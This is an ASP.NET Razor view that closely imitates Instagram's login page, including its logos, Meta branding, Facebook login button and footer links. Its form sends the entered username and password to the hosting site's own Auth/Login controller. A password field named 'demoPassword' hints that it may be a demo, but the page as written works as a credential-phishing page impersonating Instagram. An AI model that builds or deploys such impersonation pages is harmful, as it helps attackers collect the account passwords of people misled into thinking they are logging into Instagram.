@{
    ViewData["Title"] = "Log in • Instagram";
    Layout = null;
}

<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8" />

    <meta name="viewport"
          content="width=device-width, initial-scale=1.0" />

    <title>Log in • Instagram</title>


    <style>

        /* =========================================================
                   RESET
                   ========================================================= */

        * {
            box-sizing: border-box;
        }

        html,
        body {
            margin: 0;
            padding: 0;
            min-height: 100%;
        }

        body {
            min-height: 100vh;
            background: #ffffff;
            color: #000000;
            font-family: Arial, Helvetica, sans-serif;
            -webkit-font-smoothing: antialiased;
        }

        button,
        input {
            font: inherit;
        }

        button {
            cursor: pointer;
        }


        /* =========================================================
                   MAIN DESKTOP LAYOUT
                   ========================================================= */

        .page {
            min-height: 100vh;
            display: flex;
            background: #ffffff;
        }


        /* =========================================================
                   LEFT SIDE
                   ========================================================= */

        .left-side {
            width: 50%;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            border-right: 1px solid #dbdbdb;
            position: relative;
            overflow: hidden;
        }


        /* =========================================================
                   INSTAGRAM LOGO
                   ========================================================= */

        .instagram-logo {
            width: 82px;
            height: 82px;
            margin-left: 76px;
            margin-top: 72px;
        }

            .instagram-logo svg {
                width: 100%;
                height: 100%;
                display: block;
            }


        /* =========================================================
                   LEFT TEXT
                   ========================================================= */

        .left-content {
            width: 100%;
            margin-top: 34px;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        .left-title {
            margin: 0;
            max-width: 620px;
            font-size: clamp(38px, 3.2vw, 48px);
            line-height: 1.7;
            font-weight: 400;
            letter-spacing: -1.8px;
        }

        .gradient-text {
            background: linear-gradient( 90deg, #ff5f3d, #ff0080, #d629ff );
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }


        /* =========================================================
                   IMAGE COLLAGE
                   ========================================================= */

        .image-collage {
            position: relative;
            width: 430px;
            height: 330px;
            margin-top: 28px;
        }

        .photo {
            position: absolute;
            overflow: hidden;
            border-radius: 20px;
            border: 1px solid rgba(0,0,0,.08);
            box-shadow: 0 12px 30px rgba(0,0,0,.15);
            background-size: cover;
            background-position: center;
        }


        /* Back */

        .photo-back {
            width: 155px;
            height: 225px;
            left: 32px;
            top: 48px;
            transform: rotate(-7deg);
            background: linear-gradient( 145deg, #89b9d2, #dfbd80 48%, #577f55 );
            z-index: 1;
        }


        /* Right */

        .photo-right {
            width: 155px;
            height: 225px;
            right: 28px;
            top: 50px;
            transform: rotate(7deg);
            background: linear-gradient( 145deg, #83cde8, #66ad5e 52%, #edca73 );
            z-index: 2;
        }


        /* Main */

        .photo-main {
            width: 170px;
            height: 255px;
            left: 130px;
            top: 25px;
            z-index: 5;
            background: linear-gradient( 150deg, #e6c68e 0%, #d99e55 34%, #4d7080 35%, #3c5963 62%, #d59a53 63%, #f1cb78 100% );
        }


        /* Fake people */

        .person-one {
            position: absolute;
            width: 58px;
            height: 115px;
            left: 21px;
            bottom: 38px;
            border-radius: 30px 30px 15px 15px;
            background: linear-gradient( #8b5b43 0 22%, #dca77b 22% 45%, #486d3e 45% 100% );
            transform: rotate(-4deg);
        }

        .person-two {
            position: absolute;
            width: 70px;
            height: 145px;
            right: 23px;
            bottom: 18px;
            border-radius: 35px 35px 15px 15px;
            background: linear-gradient( #27231f 0 23%, #9b684a 23% 47%, #1f3544 47% 100% );
        }


        /* =========================================================
                   HEART
                   ========================================================= */

        .heart {
            position: absolute;
            left: 4px;
            bottom: 52px;
            z-index: 10;
            font-size: 50px;
            transform: rotate(-12deg);
            filter: drop-shadow( 0 8px 10px rgba(0,0,0,.18) );
        }


        /* =========================================================
                   GREEN CHIP
                   ========================================================= */

        .green-chip {
            position: absolute;
            right: 2px;
            top: 100px;
            z-index: 10;
            padding: 8px 13px;
            border-radius: 20px;
            background: #20c765;
            color: #ffffff;
            font-size: 13px;
            font-weight: 700;
            box-shadow: 0 8px 18px rgba(32,199,101,.25);
        }


        /* =========================================================
                   RIGHT LOGIN SIDE
                   ========================================================= */

        .right-side {
            width: 50%;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            padding: 50px clamp(50px, 8vw, 130px) 35px;
        }


        .login-box {
            width: 100%;
            max-width: 690px;
            margin: 0 auto;
        }


        /* =========================================================
                   LOGIN HEADING
                   ========================================================= */

        .login-title {
            margin: 0 0 31px;
            font-size: 24px;
            line-height: 1.3;
            font-weight: 600;
            color: #000000;
        }


        /* =========================================================
                   ERROR
                   ========================================================= */

        .error-message {
            margin-bottom: 15px;
            padding: 13px 15px;
            border: 1px solid #f1caca;
            border-radius: 10px;
            background: #fff7f7;
            color: #c93535;
            font-size: 13px;
        }


        /* =========================================================
                   INPUTS
                   ========================================================= */

        .field {
            position: relative;
            width: 100%;
            height: 79px;
            margin-bottom: 14px;
        }


            .field input {
                width: 100%;
                height: 100%;
                padding: 0 22px;
                border: 1px solid #ccd0d5;
                border-radius: 22px;
                outline: none;
                background: #ffffff;
                color: #000000;
                font-size: 16px;
                transition: border-color .15s ease, box-shadow .15s ease;
            }


                .field input::placeholder {
                    color: #68717c;
                    opacity: 1;
                }


                .field input:focus {
                    border-color: #737373;
                    box-shadow: 0 0 0 1px rgba(0,0,0,.03);
                }


        /* =========================================================
                   PASSWORD SHOW BUTTON
                   ========================================================= */

        .password-field input {
            padding-right: 85px;
        }


        .password-toggle {
            position: absolute;
            right: 18px;
            top: 50%;
            transform: translateY(-50%);
            border: 0;
            padding: 7px;
            background: transparent;
            color: #000000;
            font-size: 13px;
            font-weight: 600;
            display: none;
        }


        .password-field.has-value
        .password-toggle {
            display: block;
        }


        /* =========================================================
                   LOGIN BUTTON
                   ========================================================= */

        .login-button {
            width: 100%;
            height: 58px;
            margin-top: 18px;
            border: 0;
            border-radius: 30px;
            background: #8db9ed;
            color: #ffffff;
            font-size: 16px;
            font-weight: 600;
            cursor: default;
            transition: background .2s ease, transform .1s ease;
        }


            /* Instagram active state */

            .login-button.active {
                background: #0095f6;
                cursor: pointer;
            }


                .login-button.active:hover {
                    background: #1877f2;
                }


            .login-button:active {
                transform: scale(.995);
            }


        /* =========================================================
                   FORGOT PASSWORD
                   ========================================================= */

        .forgot {
            margin: 29px 0 87px;
            text-align: center;
        }


            .forgot button {
                padding: 0;
                border: 0;
                background: transparent;
                color: #000000;
                font-size: 16px;
            }


        /* =========================================================
                   FACEBOOK
                   ========================================================= */

        .facebook-button {
            width: 100%;
            height: 58px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 11px;
            border: 0;
            border-radius: 30px;
            background: #f1f2f4;
            color: #111111;
            font-size: 16px;
            font-weight: 500;
        }


        .facebook-icon {
            width: 18px;
            height: 18px;
            display: grid;
            place-items: center;
            border-radius: 50%;
            background: #0866ff;
            color: #ffffff;
            font-size: 13px;
            font-weight: 700;
        }


        /* =========================================================
                   CREATE ACCOUNT
                   ========================================================= */

        .create-button {
            width: 100%;
            height: 58px;
            margin-top: 15px;
            border: 1px solid #0866ff;
            border-radius: 30px;
            background: #ffffff;
            color: #0064e0;
            font-size: 16px;
            font-weight: 500;
        }


        /* =========================================================
                   META BRAND
                   ========================================================= */

        .meta-brand {
            margin-top: 35px;
            text-align: center;
            color: #242424;
            font-size: 18px;
            font-weight: 500;
        }


        .meta-symbol {
            color: #0866ff;
            font-size: 24px;
            font-weight: 700;
            vertical-align: -2px;
        }


        /* =========================================================
                   FOOTER
                   ========================================================= */

        .footer {
            margin-top: auto;
            padding-top: 55px;
            text-align: center;
            color: #737373;
            font-size: 10px;
            line-height: 2.3;
        }


            .footer span {
                display: inline-block;
                margin: 0 7px;
                white-space: nowrap;
            }


        /* =========================================================
                   MOBILE
                   ========================================================= */

        @@media (max-width: 760px) {

            body {
                background: #ffffff;
            }


            .page {
                display: block;
                min-height: 100vh;
            }
            /* Hide desktop left side */

            .left-side {
                display: none;
            }
            /* Right side becomes full screen */

            .right-side {
                width: 100%;
                min-height: 100vh;
                padding: 0;
                display: block;
            }
            /* =====================================================
                       MOBILE INSTAGRAM LOGO
                       ===================================================== */

            .mobile-header {
                width: 100%;
                height: 104px;
                display: flex;
                align-items: center;
                justify-content: center;
                border-bottom: 1px solid #dbdbdb;
            }


            .mobile-logo {
                width: 61px;
                height: 61px;
            }


                .mobile-logo svg {
                    width: 100%;
                    height: 100%;
                }
            /* =====================================================
                       MOBILE LOGIN BOX
                       ===================================================== */

            .login-box {
                width: 100%;
                max-width: none;
                padding: 56px 47px 0;
            }


            .login-title {
                margin-bottom: 17px;
                font-size: 14px;
                font-weight: 600;
            }
            /* =====================================================
                       MOBILE INPUTS
                       ===================================================== */

            .field {
                height: 46px;
                margin-bottom: 9px;
            }


                .field input {
                    padding: 0 12px;
                    border-radius: 13px;
                    font-size: 12px;
                }


            .password-field input {
                padding-right: 62px;
            }


            .password-toggle {
                right: 8px;
                font-size: 10px;
            }
            /* =====================================================
                       MOBILE LOGIN BUTTON
                       ===================================================== */

            .login-button {
                height: 34px;
                margin-top: 10px;
                border-radius: 18px;
                font-size: 11px;
            }
            /* =====================================================
                       MOBILE FORGOT
                       ===================================================== */

            .forgot {
                margin: 18px 0 48px;
            }


                .forgot button {
                    font-size: 11px;
                }
            /* =====================================================
                       MOBILE FACEBOOK / CREATE
                       ===================================================== */

            .facebook-button,
            .create-button {
                height: 34px;
                border-radius: 18px;
                font-size: 11px;
            }


            .facebook-icon {
                width: 13px;
                height: 13px;
                font-size: 9px;
            }


            .create-button {
                margin-top: 11px;
            }
            /* =====================================================
                       MOBILE META
                       ===================================================== */

            .meta-brand {
                margin-top: 24px;
                font-size: 13px;
            }


            .meta-symbol {
                font-size: 18px;
            }
            /* =====================================================
                       MOBILE FOOTER
                       ===================================================== */

            .footer {
                margin-top: 43px;
                padding: 16px 12px 20px;
                border-top: 1px solid #ededed;
                font-size: 7px;
                line-height: 2.2;
            }


                .footer span {
                    margin: 0 5px;
                }
        }


        /* =========================================================
                   VERY SMALL PHONES
                   ========================================================= */

        @@media (max-width: 400px) {

            .login-box {
                padding-left: 47px;
                padding-right: 47px;
            }
        }


        /* =========================================================
                   DESKTOP MOBILE HEADER HIDDEN
                   ========================================================= */

        @@media (min-width: 761px) {

            .mobile-header {
                display: none;
            }
        }

    </style>

</head>


<body>


    <div class="page">


        <!-- =========================================================
             LEFT DESKTOP SIDE
             ========================================================= -->

        <section class="left-side">


            <!-- Instagram Logo -->

            <div class="instagram-logo">

                <svg viewBox="0 0 100 100"
                     xmlns="http://www.w3.org/2000/svg">

                    <defs>

                        <linearGradient id="igGradient"
                                        x1="0%"
                                        y1="100%"
                                        x2="100%"
                                        y2="0%">

                            <stop offset="0%"
                                  stop-color="#feda75" />

                            <stop offset="25%"
                                  stop-color="#fa7e1e" />

                            <stop offset="50%"
                                  stop-color="#d62976" />

                            <stop offset="75%"
                                  stop-color="#962fbf" />

                            <stop offset="100%"
                                  stop-color="#4f5bd5" />

                        </linearGradient>

                    </defs>


                    <rect x="13"
                          y="13"
                          width="74"
                          height="74"
                          rx="21"
                          fill="none"
                          stroke="url(#igGradient)"
                          stroke-width="8" />


                    <circle cx="50"
                            cy="50"
                            r="18"
                            fill="none"
                            stroke="url(#igGradient)"
                            stroke-width="8" />


                    <circle cx="72"
                            cy="28"
                            r="5"
                            fill="#d62976" />

                </svg>

            </div>


            <!-- =====================================================
                 LEFT TEXT
                 ===================================================== -->

            <div class="left-content">


                <h1 class="left-title">

                    See everyday moments from

                    <br />

                    your

                    <span class="gradient-text">
                        close friends.
                    </span>

                </h1>


                <!-- =================================================
                     IMAGE COLLAGE
                     ================================================= -->

                <div class="image-collage">


                    <div class="photo photo-back">

                        <div class="person-one"></div>

                    </div>


                    <div class="photo photo-right">

                        <div class="person-one"></div>

                    </div>


                    <div class="photo photo-main">

                        <div class="person-one"></div>

                        <div class="person-two"></div>

                    </div>


                    <div class="heart">
                        ❤️
                    </div>


                    <div class="green-chip">
                        ★ ✓
                    </div>


                </div>


            </div>


        </section>



        <!-- =========================================================
             RIGHT SIDE
             ========================================================= -->

        <main class="right-side">


            <!-- =====================================================
                 MOBILE HEADER
                 ===================================================== -->

            <div class="mobile-header">


                <div class="mobile-logo">

                    <svg viewBox="0 0 100 100"
                         xmlns="http://www.w3.org/2000/svg">

                        <defs>

                            <linearGradient id="mobileIgGradient"
                                            x1="0%"
                                            y1="100%"
                                            x2="100%"
                                            y2="0%">

                                <stop offset="0%"
                                      stop-color="#feda75" />

                                <stop offset="25%"
                                      stop-color="#fa7e1e" />

                                <stop offset="50%"
                                      stop-color="#d62976" />

                                <stop offset="75%"
                                      stop-color="#962fbf" />

                                <stop offset="100%"
                                      stop-color="#4f5bd5" />

                            </linearGradient>

                        </defs>


                        <rect x="13"
                              y="13"
                              width="74"
                              height="74"
                              rx="21"
                              fill="none"
                              stroke="url(#mobileIgGradient)"
                              stroke-width="8" />


                        <circle cx="50"
                                cy="50"
                                r="18"
                                fill="none"
                                stroke="url(#mobileIgGradient)"
                                stroke-width="8" />


                        <circle cx="72"
                                cy="28"
                                r="5"
                                fill="#d62976" />

                    </svg>

                </div>


            </div>



            <!-- =====================================================
                 LOGIN BOX
                 ===================================================== -->

            <div class="login-box">


                <h2 class="login-title">
                    Log into Instagram
                </h2>


                @if (ViewBag.Error != null)
                {
                    <div class="error-message">
                        @ViewBag.Error
                    </div>
                }


                <!-- =================================================
                     LOGIN FORM
                     ================================================= -->

                <form method="post"
                      asp-controller="Auth"
                      asp-action="Login"
                      id="loginForm">


                    @Html.AntiForgeryToken()


                    <!-- USERNAME / EMAIL -->

                    <div class="field">

                        <input type="text"
                               id="instagramId"
                               name="instagramId"
                               placeholder="Mobile number, username or email"
                               required
                               autocomplete="off" />

                    </div>


                    <!-- BACKEND VALUE -->

                    <input type="hidden"
                           id="displayName"
                           name="displayName" />


                    <!-- PASSWORD -->

                    <div class="field password-field"
                         id="passwordField">


                        <input type="password"
                               id="demoPassword"
                               name="demoPassword"
                               placeholder="Password"
                               required
                               autocomplete="off" />


                        <button type="button"
                                class="password-toggle"
                                id="passwordToggle">

                            Show

                        </button>


                    </div>


                    <!-- LOGIN BUTTON -->

                    <button type="submit"
                            class="login-button"
                            id="loginButton"
                            disabled>

                        Log in

                    </button>


                </form>



                <!-- =================================================
                     FORGOT PASSWORD
                     ================================================= -->

                <div class="forgot">

                    <button type="button">

                        Forgot password?

                    </button>

                </div>



                <!-- =================================================
                     FACEBOOK
                     ================================================= -->

                <button type="button"
                        class="facebook-button">


                    <span class="facebook-icon">
                        f
                    </span>


                    <span>
                        Log in with Facebook
                    </span>


                </button>



                <!-- =================================================
                     CREATE ACCOUNT
                     ================================================= -->

                <button type="button"
                        class="create-button">

                    Create new account

                </button>



                <!-- =================================================
                     META
                     ================================================= -->

                <div class="meta-brand">

                    <span class="meta-symbol">
                        ∞
                    </span>

                    Meta

                </div>


            </div>



            <!-- =====================================================
                 FOOTER
                 ===================================================== -->

            <footer class="footer">


                <div>

                    <span>Meta</span>
                    <span>About</span>
                    <span>Blog</span>
                    <span>Jobs</span>
                    <span>Help</span>
                    <span>API</span>
                    <span>Privacy</span>
                    <span>Terms</span>

                </div>


                <div>

                    <span>Locations</span>
                    <span>Instagram Lite</span>
                    <span>Threads</span>
                    <span>Contact Uploading &amp; Non-Users</span>

                </div>


                <div>

                    <span>Meta Verified</span>

                </div>


            </footer>


        </main>


    </div>



    <!-- =============================================================
         JAVASCRIPT
         ============================================================= -->

    <script>


        /* =============================================================
           ELEMENTS
           ============================================================= */

        const loginForm =
            document.getElementById("loginForm");


        const usernameInput =
            document.getElementById("instagramId");


        const displayNameInput =
            document.getElementById("displayName");


        const passwordInput =
            document.getElementById("demoPassword");


        const passwordField =
            document.getElementById("passwordField");


        const passwordToggle =
            document.getElementById("passwordToggle");


        const loginButton =
            document.getElementById("loginButton");



        /* =============================================================
           PRESERVE BACKEND DISPLAY NAME
           ============================================================= */

        loginForm.addEventListener(
            "submit",
            function () {

                const value =
                    usernameInput.value.trim();


                displayNameInput.value =
                    value;

            }
        );



        /* =============================================================
           PASSWORD SHOW / HIDE
           ============================================================= */

        function updatePasswordState() {

            if (
                passwordInput.value.length > 0
            ) {

                passwordField.classList.add(
                    "has-value"
                );

            }
            else {

                passwordField.classList.remove(
                    "has-value"
                );

            }

        }


        passwordInput.addEventListener(
            "input",
            updatePasswordState
        );



        passwordToggle.addEventListener(
            "click",
            function () {

                if (
                    passwordInput.type ===
                    "password"
                ) {

                    passwordInput.type =
                        "text";


                    passwordToggle.textContent =
                        "Hide";

                }
                else {

                    passwordInput.type =
                        "password";


                    passwordToggle.textContent =
                        "Show";

                }

            }
        );



        /* =============================================================
           INSTAGRAM LOGIN BUTTON STATE
           ============================================================= */

        function updateLoginButton() {

            const username =
                usernameInput.value.trim();


            const password =
                passwordInput.value.trim();


            /*
             * Instagram-style behavior:
             *
             * Empty fields
             *      ↓
             * Pale blue button
             *
             * Both fields contain text
             *      ↓
             * Strong blue button
             */

            if (
                username.length > 0 &&
                password.length > 0
            ) {

                loginButton.classList.add(
                    "active"
                );

                loginButton.disabled = false;

            }
            else {

                loginButton.classList.remove(
                    "active"
                );

                loginButton.disabled = true;

            }

        }


        usernameInput.addEventListener(
            "input",
            updateLoginButton
        );


        passwordInput.addEventListener(
            "input",
            updateLoginButton
        );


    </script>


</body>

</html>